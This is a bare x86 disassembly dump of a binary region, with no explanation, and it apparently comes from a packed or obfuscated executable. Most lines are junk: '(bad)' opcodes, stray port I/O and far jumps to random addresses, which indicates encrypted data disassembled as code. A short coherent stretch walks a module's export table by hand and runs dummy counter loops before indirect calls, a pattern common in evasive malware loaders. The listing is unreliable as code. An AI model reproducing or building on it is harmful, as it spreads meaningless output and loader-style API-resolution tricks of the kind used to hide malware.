  414091:	push   ebx
  414092:	jno    0x414093
  414094:	out    dx,eax
  414095:	mov    bh,0x38
  414097:	push   ecx
  414098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414099:	jnp    0x4140ae
  41409b:	out    dx,al
  41409c:	test   bh,dh
  41409e:	(bad)  
  41409f:	ja     0x4140f1
  4140a1:	push   0x91e6d23a
  4140a6:	repz in eax,0x7b
  4140a9:	cmp    edi,esp
  4140ab:	cmovp  edi,DWORD PTR [edx+0x4f]
  4140af:	mov    ebx,0xb57095ca
  4140b4:	pop    eax
  4140b5:	cmp    eax,0xb8e6dcf8
  4140ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140bb:	repz lock and cl,BYTE PTR [esp+edi*4]
  4140c0:	repz cmp ah,BYTE PTR gs:[esi-0x37]
  4140c5:	in     al,0x84
  4140c7:	adc    ch,ch
  4140c9:	call   0x31ff8553
  4140ce:	jo     0x41406f
  4140d0:	jecxz  0x41414f
  4140d2:	das    
  4140d3:	imul   edx,DWORD PTR [edi+0x30731f5b],0xd0e58ed5
  4140dd:	fdiv   QWORD PTR [edx]
  4140df:	sbb    al,0x25
  4140e1:	sahf   
  4140e2:	and    edx,DWORD PTR [ebx+eiz*8]
  4140e5:	daa    
  4140e6:	xor    eax,0x4fc135fd
  4140eb:	(bad)  
  4140ec:	adc    eax,0xeccf3244
  4140f1:	cmp    DWORD PTR [edi+eax*2],edx
  4140f4:	mov    ebp,0x7755be31
  4140f9:	es xor eax,0x4aca0337
  4140ff:	pop    eax
  414100:	(bad)  
  414101:	jnp    0x4140ea
  414103:	push   ecx
  414104:	sti    
  414105:	lods   al,BYTE PTR ds:[esi]
  414106:	inc    eax
  414107:	jecxz  0x414181
  414109:	mov    ch,0xce
  41410b:	jl     0x41414f
  41410d:	(bad)  
  41410e:	jo     0x4140b6
  414110:	imul   esi,esi,0xffffff87
  414113:	sbb    BYTE PTR [ecx-0x3e],dh
  414116:	push   0x6e
  414118:	addr16 sub eax,0xdc4a56b0
  41411e:	jle    0x414118
  414120:	aad    0x5f
  414122:	xchg   BYTE PTR [edx+eax*2-0x61ab484],ch
  414129:	repz inc esp
  41412b:	repz jg 0x4140b4
  41412e:	int3   
  41412f:	scas   eax,DWORD PTR es:[edi]
  414130:	stc    
  414131:	lahf   
  414132:	lea    ebp,[edx-0x23]
  414135:	dec    esp
  414136:	sub    BYTE PTR [ebx+eax*8],ah
  414139:	xor    eax,0x6515097c
  41413e:	mov    gs,WORD PTR [eax]
  414140:	xchg   ecx,eax
  414141:	in     al,0xdb
  414143:	xchg   eax,eax
  414145:	dec    ecx
  414146:	xor    eax,0xa9aa7624
  41414b:	loop   0x41411f
  41414d:	pusha  
  41414e:	mov    edx,0x53044407
  414153:	clc    
  414154:	fiadd  WORD PTR ds:0x1b5064b1
  41415a:	or     BYTE PTR ds:[ebx],0x2b
  41415e:	mov    eax,DWORD PTR [ebp-0x14]
  414161:	and    DWORD PTR ds:0x42fdd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fdd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fdd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fdd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e66f
  41418b:	cmp    DWORD PTR ds:0x42fdd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fdd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e7ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fde9
  4141ba:	sbb    DWORD PTR ds:0x42fdd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fe05,0x42e813
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e7eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fe05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e80f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fddd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fddd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fddd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fddd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e673
  41423b:	cmp    DWORD PTR ds:0x42fddd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fddd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fddd,ecx
  414257:	cmp    DWORD PTR ds:0x42fddd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x414257
  414283:	lods   al,BYTE PTR ds:[esi]
  414284:	mov    esi,0x7073805e
  414289:	jo     0x414244
  41428b:	jle    0x4142fd
  41428d:	jo     0x414257
  41428f:	jmp    0x53fc:0x9ab856
  414296:	loop   0x4142d2
  414298:	inc    edx
  414299:	rcl    BYTE PTR [eax],cl
  41429b:	jns    0x41424a
  41429d:	fdiv   DWORD PTR [edi+0x5e3f01e1]
  4142a3:	adc    bl,dl
  4142a5:	imul   edx,DWORD PTR [edx+esi*8+0xa],0x26
  4142aa:	lds    ebx,FWORD PTR ds:0xd6464bb4
  4142b0:	pop    eax
  4142b1:	stc    
  4142b2:	imul   BYTE PTR [eax+ebp*2]
  4142b5:	xor    bl,BYTE PTR [ebp-0x4b]
  4142b8:	call   0xf794da0a
  4142bd:	sub    eax,0xc7c76497
  4142c2:	jbe    0x414300
  4142c4:	nop
  4142c5:	or     eax,0x43135d98
  4142ca:	ret    0xfac2
  4142cd:	pop    ecx
  4142ce:	int    0x30
  4142d0:	pop    es
  4142d1:	loopne 0x41427c
  4142d3:	mov    al,0x66
  4142d5:	ret    0xa015
  4142d8:	ror    DWORD PTR [eax+edx*8],1
  4142db:	cmp    al,0x4d
  4142dd:	dec    eax
  4142de:	push   edx
  4142df:	jmp    0xc099451b
  4142e4:	and    cl,ch
  4142e6:	int    0x7a
  4142e8:	xlat   BYTE PTR ds:[ebx]
  4142e9:	xchg   bh,bh
  4142eb:	icebp  
  4142ec:	and    BYTE PTR [esi-0x45],bh
  4142ef:	sbb    eax,0x961db9bf
  4142f4:	sbb    eax,0xd37a6d43
  4142f9:	push   0x6db0c3d
  4142fe:	adc    DWORD PTR [eax+0x7b],ebx
  414301:	out    dx,al
  414302:	add    BYTE PTR [ebx],bh
  414304:	inc    ecx
  414305:	out    dx,al
  414306:	daa    
  414307:	sbb    al,0xd8
  414309:	and    ebx,DWORD PTR [edi-0x40]
  41430c:	test   BYTE PTR [ecx+0x4d],0xe4
  414310:	aam    0x3b
  414312:	retf   
  414313:	out    0x9e,eax
  414315:	mov    ah,0x48
  414317:	xlat   BYTE PTR ds:[ebx]
  414318:	pop    eax
  414319:	mov    ebp,0x30ae80bf
  41431e:	push   ebx
  41431f:	add    al,0x2d
  414321:	repnz pop esi
  414323:	sbb    eax,0x10106b1c
  414328:	outs   dx,DWORD PTR ds:[esi]
  414329:	cli    
  41432a:	lock xor eax,0x61503459
  414330:	xor    eax,0x1ccc97e7
  414335:	mov    ebp,0x7833636c
  41433a:	stos   DWORD PTR es:[edi],eax
  41433b:	scas   eax,DWORD PTR es:[edi]
  41433c:	cli    
  41433d:	sbb    eax,0xb8195362
  414342:	inc    ecx
  414343:	dec    esp
  414344:	push   ebx
  414345:	repnz cmp cl,BYTE PTR [edx+0xd]
  414349:	ins    BYTE PTR es:[edi],dx
  41434a:	push   ebx
  41434b:	sub    BYTE PTR [edi],ah
  41434d:	(bad)  [ebp-0x6a11adc4]
  414353:	mov    ds:0x81e44ee4,al
  414358:	and    BYTE PTR [esi+0x26],dl
  41435b:	jns    0x4142df
  41435d:	jnp    0x414332
  41435f:	push   edx
  414360:	call   0x558b:0x7d9812dc
  414367:	jge    0x4142fb
  414369:	mov    eax,edx
  41436b:	or     dl,BYTE PTR [eax-0x44]
  41436e:	loopne 0x41434e
  414370:	fsubr  DWORD PTR [ebp+ebp*2+0x25]
  414374:	lock neg ebp
  414377:	cmp    DWORD PTR [edx-0x2fb05ba2],ebx
  41437d:	dec    DWORD PTR es:0x5e5088a9
  414384:	mov    DWORD PTR [edi+edi*2-0x3b50c29a],eax
  41438b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41438c:	call   0x9c65bbe2
  414391:	aaa    
  414392:	cld    
  414393:	push   edx
  414394:	and    ebx,DWORD PTR [ecx-0x77]
  414397:	ins    DWORD PTR es:[edi],dx
  414398:	mov    edi,0x332aaeb9
  41439d:	addr16 cli 
  41439f:	pop    DWORD PTR [esi+0x13]
  4143a2:	daa    
  4143a3:	shl    DWORD PTR [eax+0x6fc9fca7],0x2f
  4143aa:	aaa    
  4143ab:	pushf  
  4143ac:	and    esi,ebx
  4143ae:	mov    ch,0xb8
  4143b0:	data16 sbb al,bl
  4143b3:	dec    esp
  4143b4:	push   ss
  4143b5:	sub    edx,edi
  4143b7:	xchg   ebx,eax
  4143b8:	retf   
  4143b9:	addr16 xchg edi,eax
  4143bb:	and    eax,0xf705a7e8
  4143c0:	sub    BYTE PTR [edi+ecx*4+0x60],0xd0
  4143c5:	push   esp
  4143c6:	enter  0xa9d8,0xde
  4143ca:	loope  0x4143fd
  4143cc:	dec    eax
  4143cd:	dec    edi
  4143ce:	mov    bh,0xe7
  4143d0:	fmul   st,st(0)
  4143d2:	loop   0x4143dc
  4143d4:	or     eax,0x3655824a
  4143d9:	int    0x63
  4143db:	xchg   cl,dh
  4143dd:	mov    eax,ds:0x8922d57b
  4143e2:	retf   
  4143e3:	xor    bh,BYTE PTR [ebp-0x45]
  4143e6:	pop    es
  4143e7:	fidivr WORD PTR ds:0x146f8617
  4143ed:	lea    edx,[edx]
  4143ef:	(bad)  
  4143f0:	pop    edx
  4143f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f2:	adc    al,0x8e
  4143f4:	shl    al,cl
  4143f6:	pop    ebp
  4143f7:	pop    ebx
  4143f8:	cli    
  4143f9:	(bad)  
  4143fa:	xor    al,0xa6
  4143fc:	data16 mov WORD PTR [esi],es
  4143ff:	(bad)  
  414400:	hlt    
  414401:	jnp    0x414432
  414403:	xor    esi,DWORD PTR [edi+0x39]
  414406:	and    al,0xe0
  414408:	cmp    al,0x84
  41440a:	mov    cl,0x90
  41440c:	pusha  
  41440d:	sbb    dl,BYTE PTR [ebx+0x57b843b9]
  414413:	and    esp,DWORD PTR [edx+0x1]
  414416:	xlat   BYTE PTR ds:[ebx]
  414417:	pop    esi
  414418:	pop    eax
  414419:	repnz inc eax
  41441b:	call   0xb3c5c258
  414420:	sbb    DWORD PTR [eax],eax
  414422:	inc    ecx
  414423:	fdivp  st(6),st
  414425:	retf   0x482
  414428:	xlat   BYTE PTR ds:[ebx]
  414429:	add    al,0xb6
  41442b:	pop    ss
  41442c:	stc    
  41442d:	mov    edi,DWORD PTR [ebp+0x3b]
  414430:	add    cl,BYTE PTR [ecx]
  414432:	and    DWORD PTR [eax+eax*1],esi
  414435:	mov    WORD PTR [ebp+0x7019178f],es
  41443b:	inc    ebx
  41443c:	inc    ebp
  41443d:	push   esi
  41443e:	xor    eax,0x6ac73e01
  414443:	sbb    eax,0x87e46c55
  414448:	ins    BYTE PTR es:[edi],dx
  414449:	xchg   esi,eax
  41444a:	fs scas eax,DWORD PTR es:[edi]
  41444c:	ss mov bh,0x87
  41444f:	xchg   ebp,eax
  414450:	imul   esp,ebx,0xffffffcb
  414453:	adc    DWORD PTR [esi],eax
  414455:	int3   
  414456:	or     ebx,DWORD PTR [edi+0x14]
  414459:	enter  0x5ba6,0xf4
  41445d:	jecxz  0x4144bd
  41445f:	ss scas al,BYTE PTR es:[edi]
  414461:	mov    ebp,0xce5fd5ff
  414466:	adc    DWORD PTR [esp+esi*1+0x2c],ebx
  41446a:	mov    edi,0x3b6f9b8b
  41446f:	aas    
  414470:	icebp  
  414471:	fimul  WORD PTR [ebp+edi*8+0x69489332]
  414478:	jb     0x414494
  41447a:	ins    DWORD PTR es:[edi],dx
  41447b:	ds iret 
  41447d:	inc    ecx
  41447e:	xchg   ecx,eax
  41447f:	dec    ebp
  414480:	fnstenv [esi+0x7aa5e225]
  414486:	into   
  414487:	jecxz  0x41446f
  414489:	and    dl,BYTE PTR [ebx-0x2d371434]
  41448f:	push   0x0
  414491:	leave  
  414492:	sbb    al,0x4f
  414494:	fsqrt  
  414496:	(bad)  
  414497:	xchg   ebp,eax
  414498:	int3   
  414499:	idiv   BYTE PTR [ebp-0x80]
  41449c:	or     DWORD PTR [eax],edx
  41449e:	mov    ebx,0x76ac6a2f
  4144a3:	(bad)  
  4144a4:	adc    BYTE PTR [edi],al
  4144a6:	aas    
  4144a7:	sub    edi,ebp
  4144a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144aa:	stos   BYTE PTR es:[edi],al
  4144ab:	rol    ebp,1
  4144ad:	ja     0x41451c
  4144af:	rol    DWORD PTR ds:0xedf74e81,1
  4144b5:	pop    edi
  4144b6:	ss call 0xc98f:0x48864eba
  4144be:	(bad)  
  4144bf:	adc    BYTE PTR [esp+ebx*4-0x64641b30],bl
  4144c6:	pop    esi
  4144c7:	sbb    bl,ah
  4144c9:	cmp    al,0xcf
  4144cb:	icebp  
  4144cc:	dec    eax
  4144cd:	and    eax,0xb61878bd
  4144d2:	call   0xf5fd7921
  4144d7:	cmp    BYTE PTR [ecx],cl
  4144d9:	adc    al,0xb6
  4144db:	leave  
  4144dc:	lods   eax,DWORD PTR ds:[esi]
  4144dd:	or     edi,DWORD PTR [ebp+0x3ad030a9]
  4144e3:	lods   eax,DWORD PTR ds:[esi]
  4144e4:	rcl    DWORD PTR [ebx+0x28],1
  4144e7:	and    ax,WORD PTR [ebx]
  4144ea:	scas   al,BYTE PTR es:[edi]
  4144eb:	aam    0x81
  4144ed:	add    esi,DWORD PTR [eax+ebx*4]
  4144f0:	jnp    0x414498
  4144f2:	test   esp,edi
  4144f4:	pop    ebx
  4144f5:	bound  esp,QWORD PTR [ebp+ebx*8+0x5c11d5f6]
  4144fc:	add    al,0xc7
  4144fe:	addr16 (bad) 
  414500:	aam    0x1c
  414502:	jae    0x414499
  414504:	mov    dl,0xd5
  414506:	mov    ebp,gs
  414508:	loope  0x4144f0
  41450a:	push   ebx
  41450b:	in     eax,0xdf
  41450d:	ret    
  41450e:	or     eax,0x4d631cc9
  414513:	mov    bh,0x33
  414515:	mov    eax,ds:0xc2d44a33
  41451a:	call   0xc6c2:0xff9c14ce
  414521:	mov    ecx,0xc7c6e86e
  414526:	mov    BYTE PTR fs:[ebx],bh
  414529:	add    bl,BYTE PTR [ecx-0x5e04e02c]
  41452f:	mov    ds:0x6b7f2fb5,eax
  414534:	lds    esp,FWORD PTR [esi-0x69]
  414537:	xchg   ebp,eax
  414538:	test   al,0xec
  41453a:	pop    ecx
  41453b:	gs xchg esi,eax
  41453d:	jmp    0x46ec:0x3e7c5c78
  414544:	mov    ds:0x13a24505,al
  414549:	pop    eax
  41454a:	sub    BYTE PTR [eax-0x7b],0x71
  41454e:	sahf   
  41454f:	cmp    esi,DWORD PTR [edx-0x32]
  414552:	outs   dx,BYTE PTR ds:[esi]
  414553:	lahf   
  414554:	mov    dh,0xff
  414556:	jne    0x414528
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0xf5e4beb4
  414576:	cmp    DWORD PTR ds:0x707f70c9,ebx
  41457c:	mov    ecx,0xae70707e
  414581:	in     al,0xf5
  414583:	cmp    al,0x9f
  414585:	retf   
  414586:	(bad)  
  414587:	mov    cl,0x2f
  414589:	popf   
  41458a:	push   ebp
  41458b:	mov    edx,0x50362172
  414590:	jae    0x41451d
  414592:	pop    edx
  414593:	retf   
  414594:	jmp    0xb89e4ebf
  414599:	fld    DWORD PTR [edi-0x41]
  41459c:	(bad)  [eax+0x38]
  41459f:	inc    ecx
  4145a0:	mov    ds,edx
  4145a2:	xchg   ecx,eax
  4145a3:	jae    0x4145a7
  4145a5:	xchg   DWORD PTR [ebp-0xe8e5c38],esp
  4145ab:	rcl    esi,0xc4
  4145ae:	xor    al,0x48
  4145b0:	cmp    edi,DWORD PTR [eax]
  4145b2:	push   ss
  4145b3:	or     BYTE PTR [ebp+edi*4+0x46],bl
  4145b7:	xchg   DWORD PTR [ebx],esi
  4145b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145ba:	mov    cl,0xc1
  4145bc:	xor    DWORD PTR [edi-0x1c218818],edx
  4145c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145c3:	jmp    0x41459c
  4145c5:	std    
  4145c6:	outs   dx,DWORD PTR ds:[esi]
  4145c7:	jp     0x4145ba
  4145c9:	xchg   DWORD PTR [ebp+0xc],ebp
  4145cc:	or     cl,ah
  4145ce:	fdivr  QWORD PTR [edx]
  4145d0:	pop    eax
  4145d1:	mov    edx,0xfd5eb5e
  4145d6:	daa    
  4145d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145d8:	mov    edi,ecx
  4145da:	sbb    BYTE PTR [edi-0x10],bh
  4145dd:	daa    
  4145de:	fld    DWORD PTR [edx+0x3abd1adf]
  4145e4:	cmp    DWORD PTR [ebx-0x3e9b59d6],ecx
  4145ea:	das    
  4145eb:	xchg   edi,eax
  4145ec:	in     eax,0xb6
  4145ee:	mov    WORD PTR [eax-0x12],?
  4145f1:	add    DWORD PTR ds:0x3a2cea4e,0x41fa2deb
  4145fb:	int    0xc8
  4145fd:	es sub ebp,eax
  414600:	jae    0x414591
  414602:	dec    ebp
  414603:	add    ecx,DWORD PTR [edi]
  414605:	data16 or al,0x92
  414608:	push   ds
  414609:	pop    esp
  41460a:	sbb    DWORD PTR [edx-0x1b],edx
  41460d:	fadd   DWORD PTR [ecx]
  41460f:	mov    eax,edi
  414611:	push   esi
  414612:	push   ecx
  414613:	sbb    eax,0xe99dec30
  414618:	fs mov ecx,ecx
  41461b:	rcr    BYTE PTR [edx],1
  41461d:	adc    BYTE PTR [ebx+ebx*4],dh
  414620:	mov    cl,ch
  414622:	test   BYTE PTR [edx],bh
  414624:	mov    ah,0x4d
  414626:	cmp    BYTE PTR [edx-0x44c7c3f8],ah
  41462c:	rcr    BYTE PTR [ebx],1
  41462e:	js     0x414668
  414630:	mov    esp,DWORD PTR [ebx-0x6d097930]
  414636:	mov    bl,BYTE PTR [ecx-0x6]
  414639:	scas   al,BYTE PTR es:[edi]
  41463a:	in     eax,0xca
  41463c:	adc    eax,0x5fed1bed
  414641:	or     al,0xf8
  414643:	dec    ecx
  414644:	das    
  414645:	(bad)  
  414646:	outs   dx,DWORD PTR ds:[esi]
  414647:	in     al,0x37
  414649:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41464a:	imul   eax,DWORD PTR [ecx+eax*8+0x57c88fbf],0xffffffe1
  414652:	es repz add esi,esi
  414656:	cmp    eax,0x92992255
  41465b:	mov    eax,DWORD PTR ds:0x550c2041
  414661:	cmp    al,0x2c
  414663:	pop    ss
  414664:	xor    edx,edx
  414666:	and    ecx,edx
  414668:	mov    bh,0x8e
  41466a:	sbb    eax,0x1055044f
  41466f:	loopne 0x4146e3
  414671:	into   
  414672:	adc    al,BYTE PTR [edx]
  414674:	xor    al,0xf7
  414676:	dec    edi
  414677:	mov    BYTE PTR [ebx-0x33],ah
  41467a:	in     eax,0xb3
  41467c:	sub    al,0x6d
  41467e:	push   ebx
  41467f:	lock xor DWORD PTR [eax-0x68],0x87659d28
  414687:	cmp    BYTE PTR [edi],bl
  414689:	into   
  41468a:	ss rol ecx,cl
  41468d:	mov    edi,0x2314e6b
  414692:	fwait
  414693:	icebp  
  414694:	dec    edi
  414695:	loopne 0x41469e
  414697:	jle    0x4146ea
  414699:	test   BYTE PTR ds:0x30b5faf7,bl
  41469f:	dec    ebp
  4146a0:	mov    ebp,0x15ff2444
  4146a5:	sbb    dh,BYTE PTR [edi+0x22]
  4146a8:	mov    ecx,0xcf695ab1
  4146ad:	popf   
  4146ae:	xchg   esi,eax
  4146af:	fsub   DWORD PTR [ebx+0xa]
  4146b2:	mov    ebx,0xfbd4bbbb
  4146b7:	fstp   TBYTE PTR [ecx+eax*8+0x1e]
  4146bb:	(bad)  
  4146bd:	sub    dl,BYTE PTR ds:0x2e6cc6f0
  4146c3:	xor    BYTE PTR [ebx+0x16],ah
  4146c6:	mov    DWORD PTR [edx],edx
  4146c8:	nop
  4146c9:	mul    edx
  4146cb:	int    0x13
  4146cd:	xchg   ebx,ebx
  4146cf:	scas   eax,DWORD PTR es:[edi]
  4146d0:	imul   ecx,DWORD PTR [esi],0xffffffda
  4146d3:	stos   DWORD PTR es:[edi],eax
  4146d4:	loope  0x41472d
  4146d6:	mov    WORD PTR [eax],ds
  4146d8:	out    dx,eax
  4146d9:	popf   
  4146da:	lods   al,BYTE PTR ds:[esi]
  4146db:	js     0x41472e
  4146dd:	ss jl  0x18a343cd
  4146e4:	mov    ch,0x90
  4146e6:	imul   edx,DWORD PTR [ecx+0x69],0x9224c201
  4146ed:	sub    eax,0xf894395b
  4146f2:	lods   al,BYTE PTR gs:[esi]
  4146f4:	fcmovb st,st(3)
  4146f6:	adc    BYTE PTR [ecx-0x6c],cl
  4146f9:	cmp    eax,DWORD PTR [edx+0xa]
  4146fc:	mov    dl,0x1
  4146fe:	dec    ecx
  414700:	loope  0x4146d1
  414702:	scas   al,BYTE PTR es:[edi]
  414703:	in     eax,0xe0
  414705:	xor    BYTE PTR [ebp+0x5decc64e],dh
  41470b:	mov    eax,ds:0xe3c36373
  414710:	cwde   
  414711:	int3   
  414712:	push   ds
  414713:	hlt    
  414714:	cmc    
  414715:	fucomip st,st(5)
  414717:	add    BYTE PTR [ebp*1-0x5e319bb4],ch
  41471e:	pop    ds
  41471f:	sti    
  414720:	mov    ds,WORD PTR [eax-0x2a]
  414723:	in     al,0xa7
  414725:	clc    
  414726:	les    esi,FWORD PTR [esi+0x6d]
  414729:	inc    esp
  41472a:	sbb    al,0x64
  41472c:	mov    ds:0x53c8bd85,al
  414731:	push   esp
  414732:	xchg   edx,eax
  414733:	(bad)  
  414734:	stos   DWORD PTR es:[edi],eax
  414735:	cmp    ah,dh
  414737:	nop
  414738:	xor    ah,dh
  41473a:	popf   
  41473b:	fadd   QWORD PTR [ecx+0x3e]
  41473e:	xor    ebp,DWORD PTR [edi]
  414740:	push   ds
  414741:	xlat   BYTE PTR ds:[ebx]
  414742:	or     bl,BYTE PTR [ebp+0x4d]
  414745:	(bad)  
  414746:	mov    ebx,0xe65f8aca
  41474b:	in     eax,0xe
  41474d:	sbb    eax,0x69351bd7
  414752:	xchg   BYTE PTR [eax-0x29],dh
  414755:	adc    ch,bl
  414757:	cwde   
  414758:	dec    ecx
  414759:	adc    eax,0xcaba2530
  41475e:	or     ebp,0x451710c4
  414764:	mov    bh,0x2c
  414766:	mov    edi,0x86bb2df1
  41476b:	xchg   edx,eax
  41476c:	add    eax,0xb5e3fa17
  414771:	jmp    0x41479b
  414773:	adc    eax,0x4622a763
  414778:	paddsb mm0,mm3
  41477b:	(bad)  
  41477d:	jl     0x41473e
  41477f:	mov    cl,0xa2
  414781:	test   BYTE PTR [edi],bh
  414783:	xor    ecx,ecx
  414785:	test   BYTE PTR [ebx-0x2d],dh
  414788:	clc    
  414789:	jno    0x4147c3
  41478b:	cld    
  41478c:	jmp    0x41472b
  41478e:	push   0xffffffe1
  414790:	mov    al,ds:0x5ddc5e9a
  414795:	cmp    ah,bh
  414797:	std    
  414798:	call   0xe41ed140
  41479d:	retf   
  41479e:	mov    esp,0xdd9d2997
  4147a3:	mul    esi
  4147a5:	xor    eax,DWORD PTR [ebp+0x72]
  4147a8:	adc    eax,0x1d2b9983
  4147ad:	sbb    eax,0x38d7c4b5
  4147b2:	adc    al,0x83
  4147b4:	cwde   
  4147b5:	sar    DWORD PTR [edx-0x22],cl
  4147b8:	xchg   edi,eax
  4147b9:	cmp    BYTE PTR [edx+0x20],ah
  4147bc:	jmp    FWORD PTR [ecx]
  4147be:	retf   0xe91
  4147c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147c2:	std    
  4147c3:	pop    edi
  4147c4:	into   
  4147c5:	push   eax
  4147c6:	aam    0xdc
  4147c8:	mov    ebp,0x1a0779b1
  4147cd:	cmp    edi,DWORD PTR [edx+0x56a6c66e]
  4147d3:	mov    dh,BYTE PTR [esi+0x5d]
  4147d6:	les    ecx,FWORD PTR [edx+0x10abeb41]
  4147dc:	test   al,0xbc
  4147df:	fiadd  DWORD PTR [eax+0x9]
  4147e2:	mov    dl,0xa8
  4147e4:	mov    ch,0x18
  4147e6:	cmp    al,0xe5
  4147e8:	pop    esp
  4147e9:	daa    
  4147ea:	push   edi
  4147eb:	xor    al,0x8c
  4147ed:	adc    eax,0xac6e19a9
  4147f2:	jle    0x4147e2
  4147f4:	xor    dh,BYTE PTR [edx]
  4147f6:	mov    bh,BYTE PTR fs:[ebx+0x57]
  4147fa:	inc    BYTE PTR [edx]
  4147fc:	gs jge 0x414842
  4147ff:	xchg   edi,eax
  414800:	shr    BYTE PTR [ecx],1
  414802:	xchg   edi,eax
  414803:	scas   al,BYTE PTR es:[edi]
  414804:	push   es
  414805:	fwait
  414806:	je     0x41481b
  414808:	jne    0x4147a1
  41480a:	jp     0x414829
  41480c:	(bad)  
  41480d:	push   edi
  41480e:	std    
  41480f:	sahf   
  414810:	sbb    ebx,DWORD PTR [edx-0x22]
  414813:	xchg   ah,dh
  414815:	xchg   ecx,eax
  414816:	jno    0x4147f9
  414818:	gs cli 
  41481a:	or     BYTE PTR [ebx+0x51e118f3],bl
  414820:	std    
  414821:	add    sp,WORD PTR [ebx-0x2d]
  414825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414826:	xlat   BYTE PTR ds:[ebx]
  414827:	push   cs
  414828:	(bad)  
  414829:	adc    al,0x4e
  41482b:	leave  
  41482c:	ficomp DWORD PTR [eax-0x26]
  41482f:	dec    esi
  414830:	addr16 cli 
  414832:	imul   ebx,ebp,0xffffffad
  414835:	and    eax,0x6635d5d7
  41483a:	aam    0x7b
  41483c:	adc    BYTE PTR [edx+ebp*1],dl
  41483f:	add    eax,0x6991c73a
  414844:	jp     0x414840
  414846:	mov    ecx,DWORD PTR [di-0x8]
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x4148b5
  414861:	push   edi
  414862:	cwde   
  414863:	and    DWORD PTR [edx],edx
  414865:	jge    0x4148e6
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x4148e0
  41486d:	stos   DWORD PTR es:[edi],eax
  41486e:	icebp  
  41486f:	sub    DWORD PTR [ebx-0x28],eax
  414872:	sbb    bh,dl
  414874:	mov    bh,0x80
  414876:	(bad)  
  414877:	xor    al,0x31
  414879:	aam    0x6
  41487b:	imul   esi,DWORD PTR [ebp+0x43a307cd],0xa
  414882:	rol    DWORD PTR [esi-0x6157a49f],cl
  414888:	adc    DWORD PTR [ebp+0x55a9c732],ecx
  41488e:	lds    ecx,FWORD PTR [ebx+0x1c6148a8]
  414894:	mov    ebx,0x4d23933a
  414899:	icebp  
  41489a:	lock cmp bl,BYTE PTR [ebp+ebp*2-0x3c]
  41489f:	(bad)  
  4148a0:	into   
  4148a1:	mov    edi,0xe6b363e4
  4148a6:	in     al,dx
  4148a7:	pop    esp
  4148a8:	mov    dl,0x3c
  4148aa:	lahf   
  4148ab:	adc    esi,DWORD PTR [ecx-0x6cf1023d]
  4148b1:	add    BYTE PTR [esi+0x665324d],bh
  4148b7:	gs loope 0x414909
  4148ba:	jo     0x4148f6
  4148bc:	call   0xdbc5345e
  4148c1:	mov    esi,0xafee8cd8
  4148c6:	std    
  4148c7:	cmp    eax,0x9af3b02a
